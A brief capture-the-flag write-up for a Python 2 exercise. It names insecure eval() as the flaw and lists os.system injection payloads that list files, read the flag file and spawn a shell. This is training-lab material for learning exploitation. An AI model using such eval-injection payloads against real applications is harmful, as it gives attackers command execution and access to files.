# Exercise 2-2 Python 1+1 [100 points] (49 solves)
python 2 Vulnerability: Insecure use of `eval()` \
`__import__('os').system("ls")` \
`__import__('os').system("cat flag")`

Alternatively, you can do

`__import__('os').system("/bin/sh")` \
`cat flag`